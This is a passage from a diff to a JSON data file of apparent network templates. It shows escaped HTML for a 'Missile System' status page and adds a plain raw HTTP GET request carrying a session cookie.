class=\"value\"\u003eOK\u003c/span\u003e\n\t\t\t\t\u003c/div\u003e\n\t\t\t\t\u003cdiv id=\"managemenetstatus_content\"\u003e\n\t\t\t\t\t\u003cdiv id=\"earlywarning_status\" class=\"level3_title\"\u003e\n\t\t\t\t\t\t\u003cspan class=\"name\"\u003eMissile System\u003c/span\u003e\n\t\t\t\t\t\t\u003cspan class=\"value\"\u003eOK\u003c/span\u003e\n\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\u003c/div\u003e\n\t\t\t\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e"
+    ],
+    [
+      "Network and Web",
+      "HTTP",
+      "0",
+      "No",
+      "\u003cHTTP GET with Cookie\u003e",
+      "Raw HTTP GET with Cookie.",
+      "",
+      "GET /settings HTTP/1.0\nCookie: SID=123; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 19:59:23 GMT; Path=/"
     ]
   ]
 }
